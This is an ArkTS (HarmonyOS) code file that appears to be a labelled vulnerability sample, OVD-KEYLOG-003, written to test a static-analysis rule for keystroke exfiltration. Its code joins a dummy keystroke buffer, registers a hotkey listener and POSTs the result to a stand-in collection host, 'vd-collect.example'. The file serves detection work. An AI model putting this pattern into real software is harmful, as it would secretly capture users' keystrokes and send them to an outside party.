// VULN: OVD-KEYLOG-003 按键缓冲聚合（join）后批量外传（string-op-flow：聚合→外传，CWE-200）
// 规则语义：字符串聚合算子 join 与收集端点字面量在 record 域共同出现
import { inputConsumer } from '@kit.InputKit';
import { http } from '@kit.NetworkKit';
import { BusinessError } from '@kit.BasicServicesKit';

export function ovdKeylog003(): string {
  // 聚合：按键缓冲 join 成单串后批量外传（非逐键即时处理）
  const strokeBuf: string[] = ['vd-keystroke-batch', 'a', 'b'];
  const payload = strokeBuf.join('');
  let err = '';
  try {
    inputConsumer.on('hotkeyChange', { preKeys: [2019], finalKey: 2012 },
      (ho: inputConsumer.HotkeyOptions) => {});
  } catch (e) {
    err = ` (sub err=${(e as BusinessError).code})`;
  }
  const req: http.HttpRequest = http.createHttp();
  req.request('https://vd-collect.example/keystrokes', {
    method: http.RequestMethod.POST,
    extraData: payload,
    readTimeout: 3000,
    connectTimeout: 3000
  }).catch(() => {});
  req.destroy();
  return `keystrokes joined len=${payload.length}, batch exfil armed${err}`;
}
